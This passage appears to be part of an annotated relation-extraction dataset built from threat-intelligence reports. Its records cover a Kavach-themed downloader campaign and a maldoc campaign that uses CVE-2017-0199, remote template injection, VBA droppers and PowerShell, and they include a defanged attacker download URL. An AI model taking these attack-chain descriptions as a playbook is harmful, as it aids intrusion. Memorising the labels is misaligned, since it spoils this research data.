"on", "the", "endpoint", "."], ["In", "order", "to", "imitate", "legitimacy", ",", "downloaders", "download", "a", "legal", "version", "of", "Kavach", "application", "'s", "MSI", "installer", "from", "another", "website", ",", "which", "is", "managed", "by", "the", "attacker", ".", "Afterwards", ",", "the", "installer", "is", "launched", ",", "completing", "the", "whole", "attack", "chain", "."], ["Downloaders", "are", "responsible", "for", "bringing", "in", "the", "malicious", "payload", "and", "the", "legal", "Kavach", "installer", "."], ["In", "the", "campaign", ",", "there", "is", "another", "form", "of", "initial", "infection", "vector", "that", "involves", "a", "downloader", "binary", "that", "is", "largely", "sized", "at", "141MB", ".", "The", "downloader", "consists", "of", "the", "complete", "MSI", "installer", "(", "legitimate", "one", ")", "for", "the", "Kavach", "application", "."], ["The", "zipped", "version", "of", "the", "installer", "(", "MSI", ")", "is", "removed", "from", "the", "resources", "of", "the", "downloader", ",", "and", "it", "is", "executed", "on", "the", "system", "to", "appear", "legal", "to", "reach", "the", "targeted", "audience", "."], ["The", "implanted", "malware", "is", "then", "uploaded", "from", "a", "remote", "area", ",", "decrypted", "by", "utilizing", "a", "hardcoded", "key", "of", "AES", "and", "saved", "on", "the", "infected", "endpoint", "."], ["The", "next", "variant", "of", "the", "downloader", "downloads", "and", "decodes", "the", "payload", "from", "a", "different", "remote", "location", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [17, 17], "name": "Kavach", "pos": [17, 18], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [29, 29], "name": "downloaders", "pos": [4, 5], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [34, 34], "name": "website", "pos": [9, 10], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [47, 47], "name": "payload", "pos": [22, 23], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [70, 70], "name": "Kavach application 's MSI installer", "pos": [12, 17], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [77, 77], "name": "website", "pos": [19, 20], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [99, 99], "name": "Downloaders", "pos": [0, 1], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [107, 107], "name": "payload", "pos": [8, 9], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [111, 111], "name": "Kavach installer", "pos": [12, 14], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [129, 129], "name": "downloader binary", "pos": [15, 17], "index": "9_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [144, 144], "name": "MSI", "pos": [30, 31], "index": "10_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [156, 156], "name": "zipped", "pos": [1, 2], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [168, 168], "name": "resources of the downloader", "pos": [13, 17], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [220, 220], "name": "downloader", "pos": [5, 6], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [225, 225], "name": "payload", "pos": [10, 11], "index": "14_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [229, 229], "name": "remote location", "pos": [14, 16], "index": "15_0"}]], "labels": [{"r": "ST", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "RF", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "RF", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 1, "t": 3}, {"r": "EX", "evidence": [1], "h": 1, "t": 3}, {"r": "WR", "evidence": [1, 2], "h": 1, "t": 4}, {"r": "RF", "evidence": [1, 2], "h": 1, "t": 5}, {"r": "FR", "evidence": [1, 2, 3], "h": 1, "t": 6}, {"r": "CO", "evidence": [1, 2, 3], "h": 3, "t": 7}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 8}, {"r": "EX", "evidence": [3], "h": 6, "t": 7}, {"r": "CD", "evidence": [3], "h": 6, "t": 8}, {"r": "EX", "evidence": [3], "h": 6, "t": 8}, {"r": "WR", "evidence": [3, 4], "h": 6, "t": 9}, {"r": "CO", "evidence": [4, 5], "h": 10, "t": 11}, {"r": "WR", "evidence": [4, 5, 6, 7], "t": 9, "h": 13}, {"r": "WR", "evidence": [5, 6, 7], "t": 11, "h": 13}, {"r": "EX", "evidence": [5, 6, 7], "t": 12, "h": 13}, {"r": "WR", "evidence": [7], "h": 13, "t": 14}, {"r": "RF", "evidence": [7], "h": 13, "t": 15}]}, {"title": "063-0", "sents": [["The", "initial", "vector", "of", "this", "attack", "is", "a", "phishing", "email", "with", "a", "malicious", "Microsoft", "Word", "document", "attachment", "containing", "an", "exploit", "that", "attempts", "to", "exploit", "the", "vulnerability", "CVE-2017-0199", ",", "a", "remote", "code", "execution", "issue", "in", "Microsoft", "Office", "."], ["If", "a", "victim", "opens", "the", "maldoc", ",", "it", "downloads", "a", "malicious", "Word", "document", "template", "hosted", "on", "an", "attacker-controlled", "Bitbucket", "repository", "."], ["Talos", "discovered", "two", "attack", "methodologies", "employed", "by", "the", "attacker", "in", "this", "campaign", ":", "One", "in", "which", "the", "downloaded", "DOTM", "template", "executes", "an", "embedded", "malicious", "Visual", "Basic", "script", ",", "which", "leads", "to", "the", "generation", "and", "execution", "of", "other", "obfuscated", "VB", "and", "PowerShell", "scripts", "and", "another", "that", "involves", "the", "malicious", "VB", "downloading", "and", "running", "a", "Windows", "executable", "that", "executes", "malicious", "PowerShell", "commands", "to", "download", "and", "implant", "the", "payload", "."], ["The", "beacon", "configuration", "contains", "commands", "to", "perform", "targeted", "process", "injection", "of", "arbitrary", "binaries", "and", "has", "a", "high", "reputation", "domain", "configured", ",", "exhibiting", "the", "redirection", "technique", "to", "masquerade", "the", "beacon", "'s", "traffic", "."], ["Initial", "vectorThe", "initial", "infection", "email", "is", "themed", "to", "entice", "the", "recipient", "to", "review", "the", "attached", "Word", "document", "and", "provide", "some", "of", "their", "personal", "information", "."], ["Initial", "malicious", "email", "message", "."], ["The", "threat", "actor", "constructed", "the", "maldoc", "to", "contain", "the", "text", "lures", "to", "make", "it", "appear", "as", "a", "legitimate", "document", "on", "May", "6", ",", "2022", "."], ["Talos", "discovered", "two", "different", "attack", "methodologies", "of", "this", "campaign", "with", "a", "few", "variations", "in", "the", "TTPs", "'", ",", "while", "the", "initial", "infection", "vector", ",", "use", "of", "remote", "template", "injection", "technique", "and", "the", "final", "payload", "remained", "the", "same", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "document", "pos": [15, 16], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [26, 26], "name": "CVE-2017-0199", "pos": [26, 27], "index": "1_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [39, 39], "name": "victim", "pos": [2, 3], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [42, 42], "name": "maldoc", "pos": [5, 6], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [44, 44], "name": "it", "pos": [7, 8], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [50, 50], "name": "template", "pos": [13, 14], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [55, 55], "name": "Bitbucket repository", "pos": [18, 20], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [76, 76], "name": "DOTM template", "pos": [18, 20], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [82, 82], "name": "Visual Basic script", "pos": [24, 27], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [96, 96], "name": "VB and PowerShell scripts", "pos": [38, 42], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [106, 106], "name": "VB", "pos": [48, 49], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [112, 112], "name": "executable", "pos": [54, 55], "index": "11_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [116, 116], "name": "PowerShell commands", "pos": [58, 60], "index": "12_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [123, 123], "name": "payload", "pos": [65, 66], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [173, 173], "name": "document", "pos": [16, 17], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [205, 205], "name": "document", "pos": [18, 19], "index": "15_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "CO", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 14}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5, 6], "h": 0, "t": 15}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "FR", "evidence": [1], "h": 2, "t": 4}, {"r": "EX", "evidence": [1], "t": 3, "h": 4}, {"r": "WR", "evidence": [1], "h": 4, "t": 5}, {"r": "ST", "evidence": [1], "h": 4, "t": 6}, {"r": "RF", "evidence": [1], "h": 4, "t": 6}, {"r": "FR", "evidence": [1, 2], "h": 2, "t": 7}, {"r": "EX", "evidence": [1, 2], "t": 5, "h": 7}, {"r": "FR", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [2], "h": 8, "t": 9}, {"r": "EX", "evidence": [2], "h": 8, "t": 9}, {"r": "WR", "evidence": [2], "h": 7, "t": 10}, {"r": "FR", "evidence": [2], "h": 7, "t": 11}, {"r": "FR", "evidence": [2], "h": 11, "t": 12}, {"r": "WR", "evidence": [2], "h": 12, "t": 13}, {"r": "EX", "evidence": [2], "h": 12, "t": 13}]}, {"title": "063-1", "sents": [["If", "a", "victim", "opens", "the", "maldoc", ",", "it", "downloads", "a", "malicious", "Word", "document", "template", "hosted", "on", "an", "attacker-controlled", "Bitbucket", "repository", "."], ["Talos", "discovered", "two", "attack", "methodologies", "employed", "by", "the", "attacker", "in", "this", "campaign", ":", "One", "in", "which", "the", "downloaded", "DOTM", "template", "executes", "an", "embedded", "malicious", "Visual", "Basic", "script", ",", "which", "leads", "to", "the", "generation", "and", "execution", "of", "other", "obfuscated", "VB", "and", "PowerShell", "scripts", "and", "another", "that", "involves", "the", "malicious", "VB", "downloading", "and", "running", "a", "Windows", "executable", "that", "executes", "malicious", "PowerShell", "commands", "to", "download", "and", "implant", "the", "payload", "."], ["The", "beacon", "configuration", "contains", "commands", "to", "perform", "targeted", "process", "injection", "of", "arbitrary", "binaries", "and", "has", "a", "high", "reputation", "domain", "configured", ",", "exhibiting", "the", "redirection", "technique", "to", "masquerade", "the", "beacon", "'s", "traffic", "."], ["Initial", "vectorThe", "initial", "infection", "email", "is", "themed", "to", "entice", "the", "recipient", "to", "review", "the", "attached", "Word", "document", "and", "provide", "some", "of", "their", "personal", "information", "."], ["Initial", "malicious", "email", "message", "."], ["The", "threat", "actor", "constructed", "the", "maldoc", "to", "contain", "the", "text", "lures", "to", "make", "it", "appear", "as", "a", "legitimate", "document", "on", "May", "6", ",", "2022", "."], ["Talos", "discovered", "two", "different", "attack", "methodologies", "of", "this", "campaign", "with", "a", "few", "variations", "in", "the", "TTPs", "'", ",", "while", "the", "initial", "infection", "vector", ",", "use", "of", "remote", "template", "injection", "technique", "and", "the", "final", "payload", "remained", "the", "same", "."], ["Stage", "1", "maldoc", ":", "DOTM", "templateThe", "malicious", "Word", "document", "contains", "an", "embedded", "URL", ",", "https", "[", ":", "//", "]", "bitbucket.org/atlasover/atlassiancore/downloads/EmmaJardi.dotm", ",", "within", "its", "relationship", "component", "``", "word/_rels/settings.xml.rels", "''", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [2, 2], "name": "victim", "pos": [2, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "maldoc", "pos": [5, 6], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "it", "pos": [7, 8], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "template", "pos": [13, 14], "index": "3_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [18, 18], "name": "Bitbucket repository", "pos": [18, 20], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [39, 39], "name": "DOTM template", "pos": [18, 20], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [45, 45], "name": "Visual Basic script", "pos": [24, 27], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [59, 59], "name": "VB and PowerShell scripts", "pos": [38, 42], "index": "7_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [69, 69], "name": "VB", "pos": [48, 49], "index": "8_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [75, 75], "name": "executable", "pos": [54, 55], "index": "9_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [79, 79], "name": "PowerShell commands", "pos": [58, 60], "index": "10_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [86, 86], "name": "payload", "pos": [65, 66], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [136, 136], "name": "document", "pos": [16, 17], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [168, 168], "name": "document", "pos": [18, 19], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [221, 221], "name": "document", "pos": [8, 9], "index": "14_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [227, 227], "name": "https [ : // ] bitbucket.org/atlasover/atlassiancore/downloads/EmmaJardi.dotm", "pos": [14, 20], "index": "15_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "EX", "evidence": [0], "t": 1, "h": 2}, {"r": "WR", "evidence": [0], "h": 2, "t": 3}, {"r": "ST", "evidence": [0], "h": 2, "t": 4}, {"r": "RF", "evidence": [0], "h": 2, "t": 4}, {"r": "FR", "evidence": [0, 1], "h": 0, "t": 5}, {"r": "EX", "evidence": [0, 1], "t": 3, "h": 5}, {"r": "FR", "evidence": [1], "h": 5, "t": 6}, {"r": "WR", "evidence": [1], "h": 6, "t": 7}, {"r": "EX", "evidence": [1], "h": 6, "t": 7}, {"r": "WR", "evidence": [1], "h": 5, "t": 8}, {"r": "FR", "evidence": [1], "h": 5, "t": 9}, {"r": "FR", "evidence": [1], "h": 9, "t": 10}, {"r": "WR", "evidence": [1], "h": 10, "t": 11}, {"r": "EX", "evidence": [1], "h": 10, "t": 11}]}, {"title": "063-2", "sents": [["Talos", "discovered", "two", "attack", "methodologies", "employed", "by", "the", "attacker", "in", "this", "campaign", ":", "One", "in", "which", "the", "downloaded", "DOTM", "template", "executes", "an", "embedded", "malicious", "Visual", "Basic", "script", ",", "which", "leads", "to", "the", "generation", "and", "execution", "of", "other", "obfuscated", "VB", "and", "PowerShell", "scripts", "and", "another", "that", "involves", "the", "malicious", "VB", "downloading", "and", "running", "a", "Windows", "executable", "that", "executes", "malicious", "PowerShell", "commands", "to", "download", "and", "implant", "the", "payload", "."], ["The", "beacon", "configuration", "contains", "commands", "to", "perform", "targeted", "process", "injection", "of", "arbitrary", "binaries", "and", "has", "a", "high", "reputation", "domain", "configured", ",", "exhibiting", "the", "redirection", "technique", "to", "masquerade", "the", "beacon", "'s", "traffic", "."], ["Initial", "vectorThe", "initial", "infection", "email", "is", "themed", "to", "entice", "the", "recipient", "to", "review", "the", "attached", "Word", "document", "and", "provide", "some", "of", "their", "personal", "information", "."], ["Initial", "malicious", "email", "message", "."], ["The", "threat", "actor", "constructed", "the", "maldoc", "to", "contain", "the", "text", "lures", "to", "make", "it", "appear", "as", "a", "legitimate", "document", "on", "May", "6", ",", "2022", "."], ["Talos", "discovered", "two", "different", "attack", "methodologies", "of", "this", "campaign", "with", "a", "few", "variations", "in", "the", "TTPs", "'", ",", "while", "the", "initial", "infection", "vector", ",", "use", "of", "remote", "template", "injection", "technique", "and", "the", "final", "payload", "remained", "the", "same", "."], ["Stage", "1", "maldoc", ":", "DOTM", "templateThe", "malicious", "Word", "document", "contains", "an", "embedded", "URL", ",", "https", "[", ":", "//", "]", "bitbucket.org/atlasover/atlassiancore/downloads/EmmaJardi.dotm", ",", "within", "its", "relationship", "component", "``", "word/_rels/settings.xml.rels", "''", "."], ["When", "a", "victim", "opens", "the", "document", ",", "the", "malicious", "DOTM", "file", "is", "downloaded", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [18, 18], "name": "DOTM template", "pos": [18, 20], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [24, 24], "name": "Visual Basic script", "pos": [24, 27], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [38, 38], "name": "VB and PowerShell scripts", "pos": [38, 42], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [48, 48], "name": "VB", "pos": [48, 49], "index": "3_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [54, 54], "name": "executable", "pos": [54, 55], "index": "4_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [58, 58], "name": "PowerShell commands", "pos": [58, 60], "index": "5_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [65, 65], "name": "payload", "pos": [65, 66], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [115, 115], "name": "document", "pos": [16, 17], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [147, 147], "name": "document", "pos": [18, 19], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [200, 200], "name": "document", "pos": [8, 9], "index": "9_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [206, 206], "name": "https [ : // ] bitbucket.org/atlasover/atlassiancore/downloads/EmmaJardi.dotm", "pos": [14, 20], "index": "10_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [223, 223], "name": "victim", "pos": [2, 3], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [226, 226], "name": "document", "pos": [5, 6], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [230, 230], "name": "DOTM file", "pos": [9, 11], "index": "13_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 1, "t": 2}, {"r": "EX", "evidence": [0], "h": 1, "t": 2}, {"r": "WR", "evidence": [0], "h": 0, "t": 3}, {"r": "FR", "evidence": [0], "h": 0, "t": 4}, {"r": "FR", "evidence": [0], "h": 4, "t": 5}, {"r": "WR", "evidence": [0], "h": 5, "t": 6}, {"r": "EX", "evidence": [0], "h": 5, "t": 6}, {"r": "FR", "evidence": [7], "h": 11, "t": 12}, {"r": "EX", "evidence": [6, 7], "t": 9, "h": 12}, {"r": "ST", "evidence": [6, 7], "t": 10, "h": 12}, {"r": "RF", "evidence": [6, 7], "t": 10, "h": 12}, {"r": "WR", "evidence": [7], "h": 12, "t": 13}]}, {"title": "063-3", "sents": [["The", "beacon", "configuration", "contains", "commands", "to", "perform", "targeted", "process", "injection", "of", "arbitrary", "binaries", "and", "has", "a", "high", "reputation", "domain", "configured", ",", "exhibiting", "the", "redirection", "technique", "to", "masquerade", "the", "beacon", "'s", "traffic", "."], ["Initial", "vectorThe", "initial", "infection", "email", "is", "themed", "to", "entice", "the", "recipient", "to", "review", "the", "attached", "Word", "document", "and", "provide", "some", "of", "their", "personal", "information", "."], ["Initial", "malicious", "email", "message", "."], ["The", "threat", "actor", "constructed", "the", "maldoc", "to", "contain", "the", "text", "lures", "to", "make", "it", "appear", "as", "a", "legitimate", "document", "on", "May", "6", ",", "2022", "."], ["Talos", "discovered", "two", "different", "attack", "methodologies", "of", "this", "campaign", "with", "a", "few", "variations", "in", "the", "TTPs", "'", ",", "while", "the", "initial", "infection", "vector", ",", "use", "of", "remote", "template", "injection", "technique", "and", "the", "final", "payload", "remained", "the", "same", "."], ["Stage", "1", "maldoc", ":", "DOTM", "templateThe", "malicious", "Word", "document", "contains", "an", "embedded", "URL", ",", "https", "[", ":", "//", "]", "bitbucket.org/atlasover/atlassiancore/downloads/EmmaJardi.dotm", ",", "within", "its", "relationship", "component", "``", "word/_rels/settings.xml.rels", "''", "."], ["When", "a", "victim", "opens", "the", "document", ",", "the", "malicious", "DOTM", "file", "is", "downloaded", "."], ["Stage", "2", ":", "VBA", "dropperThe", "downloaded", "DOTM", "executes", "the", "malicious", "Visual", "Basic", "for", "Applications", "(", "VBA", ")", "macro", "."]], "vertexSet": [[{"type": "MF", "sent_id": 1, "global_pos": [48, 48], "name": "document", "pos": [16, 17], "index": "0_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [80, 80], "name": "document", "pos": [18, 19], "index": "1_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [133, 133], "name": "document", "pos": [8, 9], "index": "2_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [139, 139], "name": "https [ : // ] bitbucket.org/atlasover/atlassiancore/downloads/EmmaJardi.dotm", "pos": [14, 20], "index": "3_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [156, 156], "name": "victim", "pos": [2, 3], "index": "4_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [159, 159], "name": "document", "pos": [5, 6], "index": "5_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [163, 163], "name": "DOTM file", "pos": [9, 11], "index": "6_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [174, 174], "name": "DOTM", "pos": [6, 7], "index": "7_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [178, 178], "name": "Visual Basic for Applications", "pos": [10, 14], "index": "8_0"}]], "labels": [{"r": "FR", "evidence": [6], "h": 4, "t": 5}, {"r": "EX", "evidence": [5, 6], "t": 2, "h": 5}, {"r": "ST", "evidence": [5, 6], "t": 3, "h": 5}, {"r": "RF", "evidence": [5, 6], "t": 3, "h": 5}, {"r": "WR", "evidence": [6], "h": 5, "t": 6}, {"r": "EX", "evidence": [6, 7], "t": 6, "h": 7}]}, {"title": "063-4", "sents": [["Initial", "vectorThe", "initial", "infection", "email", "is", "themed", "to", "entice", "the", "recipient", "to", "review", "the", "attached", "Word", "document", "and", "provide", "some", "of", "their", "personal", "information", "."], ["Initial", "malicious", "email", "message", "."], ["The", "threat", "actor", "constructed", "the", "maldoc", "to", "contain", "the", "text", "lures", "to", "make", "it", "appear", "as", "a", "legitimate", "document", "on", "May", "6", ",", "2022", "."], ["Talos", "discovered", "two", "different", "attack", "methodologies", "of", "this", "campaign", "with", "a", "few", "variations", "in", "the", "TTPs", "'", ",", "while", "the", "initial", "infection", "vector", ",", "use", "of", "remote", "template", "injection", "technique", "and", "the", "final", "payload", "remained", "the", "same", "."], ["Stage", "1", "maldoc", ":", "DOTM", "templateThe", "malicious", "Word", "document", "contains", "an", "embedded", "URL", ",", "https", "[", ":", "//", "]", "bitbucket.org/atlasover/atlassiancore/downloads/EmmaJardi.dotm", ",", "within", "its", "relationship", "component", "``", "word/_rels/settings.xml.rels", "''", "."], ["When", "a", "victim", "opens", "the", "document", ",", "the", "malicious", "DOTM", "file", "is", "downloaded", "."], ["Stage", "2", ":", "VBA", "dropperThe", "downloaded", "DOTM", "executes", "the", "malicious", "Visual", "Basic", "for", "Applications", "(", "VBA", ")", "macro", "."], ["The", "VBA", "dropper", "code", "contains", "an", "encoded", "data", "blob", "which", "is", "decoded", "and", "written", "into", "an", "HTA", "file", ",", "``", "example.hta", ",", "''", "in", "the", "user", "profile", "local", "application", "temporary", "folder", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [16, 16], "name": "document", "pos": [16, 17], "index": "0_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [48, 48], "name": "document", "pos": [18, 19], "index": "1_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [101, 101], "name": "document", "pos": [8, 9], "index": "2_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [107, 107], "name": "https [ : // ] bitbucket.org/atlasover/atlassiancore/downloads/EmmaJardi.dotm", "pos": [14, 20], "index": "3_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [124, 124], "name": "victim", "pos": [2, 3], "index": "4_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [127, 127], "name": "document", "pos": [5, 6], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [131, 131], "name": "DOTM file", "pos": [9, 11], "index": "6_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [142, 142], "name": "DOTM", "pos": [6, 7], "index": "7_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [146, 146], "name": "Visual Basic for Applications", "pos": [10, 14], "index": "8_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [156, 156], "name": "VBA dropper", "pos": [1, 3], "index": "9_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [175, 175], "name": "example.hta", "pos": [20, 21], "index": "10_0"}]], "labels": [{"r": "FR", "evidence": [5], "h": 4, "t": 5}, {"r": "EX", "evidence": [4, 5], "t": 2, "h": 5}, {"r": "ST", "evidence": [4, 5], "t": 3, "h": 5}, {"r": "RF", "evidence": [4, 5], "t": 3, "h": 5}, {"r": "WR", "evidence": [5], "h": 5, "t": 6}, {"r": "EX", "evidence": [5, 6], "t": 6, "h": 7}, {"r": "FR", "evidence": [6, 7], "h": 7, "t": 9}, {"r": "EX", "evidence": [6, 7], "t": 8, "h": 9}, {"r": "WR", "evidence": [7], "h": 9, "t": 10}]}, {"title": "063-5", "sents": [["Initial", "malicious", "email", "message", "."], ["The", "threat", "actor", "constructed", "the", "maldoc", "to", "contain", "the", "text", "lures", "to", "make", "it", "appear", "as", "a", "legitimate", "document", "on", "May", "6", ",", "2022", "."], ["Talos", "discovered", "two", "different", "attack", "methodologies", "of", "this", "campaign", "with", "a", "few", "variations", "in", "the", "TTPs", "'", ",", "while", "the", "initial", "infection", "vector", ",", "use", "of", "remote", "template", "injection", "technique", "and", "the", "final", "payload", "remained", "the", "same", "."], ["Stage", "1", "maldoc", ":", "DOTM", "templateThe", "malicious", "Word", "document", "contains", "an", "embedded", "URL", ",", "https", "[", ":", "//", "]", "bitbucket.org/atlasover/atlassiancore/downloads/EmmaJardi.dotm", ",", "within", "its", "relationship", "component", "``", "word/_rels/settings.xml.rels", "''", "."], ["When", "a", "victim", "opens", "the", "document", ",", "the", "malicious", "DOTM", "file", "is", "downloaded", "."], ["Stage", "2", ":", "VBA", "dropperThe", "downloaded", "DOTM", "executes", "the", "malicious", "Visual", "Basic", "for", "Applications", "(", "VBA", ")", "macro", "."], ["The", "VBA", "dropper", "code", "contains", "an", "encoded", "data", "blob", "which", "is", "decoded", "and", "written", "into", "an", "HTA", "file", ",", "``", "example.hta", ",", "''", "in", "the", "user", "profile", "local", "application", "temporary", "folder", "."], ["The", "decoded", "content", "written", "to", "an", "HTA", "file", "is", "the", "next", "VB", "script", ",", "which", "is", "executed", "using", "the", "ShellExecuted", "method", "."]], "vertexSet": [[{"type": "MF", "sent_id": 1, "global_pos": [23, 23], "name": "document", "pos": [18, 19], "index": "0_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [76, 76], "name": "document", "pos": [8, 9], "index": "1_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [82, 82], "name": "https [ : // ] bitbucket.org/atlasover/atlassiancore/downloads/EmmaJardi.dotm", "pos": [14, 20], "index": "2_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [99, 99], "name": "victim", "pos": [2, 3], "index": "3_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [102, 102], "name": "document", "pos": [5, 6], "index": "4_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [106, 106], "name": "DOTM file", "pos": [9, 11], "index": "5_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [117, 117], "name": "DOTM", "pos": [6, 7], "index": "6_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [121, 121], "name": "Visual Basic for Applications", "pos": [10, 14], "index": "7_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [131, 131], "name": "VBA dropper", "pos": [1, 3], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [150, 150], "name": "example.hta", "pos": [20, 21], "index": "9_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [168, 168], "name": "HTA file", "pos": [6, 8], "index": "10_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [181, 181], "name": "ShellExecuted", "pos": [19, 20], "index": "11_0"}]], "labels": [{"r": "FR", "evidence": [4], "h": 3, "t": 4}, {"r": "EX", "evidence": [3, 4], "t": 1, "h": 4}, {"r": "ST", "evidence": [3, 4], "t": 2, "h": 4}, {"r": "RF", "evidence": [3, 4], "t": 2, "h": 4}, {"r": "WR", "evidence": [4], "h": 4, "t": 5}, {"r": "EX", "evidence": [4, 5], "t": 5, "h": 6}, {"r": "FR", "evidence": [5, 6], "h": 6, "t": 8}, {"r": "EX", "evidence": [5, 6], "t": 7, "h": 8}, {"r": "WR", "evidence": [6], "h": 8, "t": 9}, {"r": "CO", "evidence": [6, 7], "h": 9, "t": 10}, {"r": "EX", "evidence": [7], "t": 10, "h": 11}]}, {"title": "063-6", "sents": [["The", "threat", "actor", "constructed", "the", "maldoc", "to", "contain", "the", "text", "lures", "to", "make", "it", "appear", "as", "a", "legitimate", "document", "on", "May", "6", ",", "2022", "."], ["Talos", "discovered", "two", "different", "attack", "methodologies", "of", "this", "campaign", "with", "a", "few", "variations", "in", "the", "TTPs", "'", ",", "while", "the", "initial", "infection", "vector", ",", "use", "of", "remote", "template", "injection", "technique", "and", "the", "final", "payload", "remained", "the", "same", "."], ["Stage", "1", "maldoc", ":", "DOTM", "templateThe", "malicious", "Word", "document", "contains", "an", "embedded", "URL", ",", "https", "[", ":", "//", "]", "bitbucket.org/atlasover/atlassiancore/downloads/EmmaJardi.dotm", ",", "within", "its", "relationship", "component", "``", "word/_rels/settings.xml.rels", "''", "."], ["When", "a", "victim", "opens", "the", "document", ",", "the", "malicious", 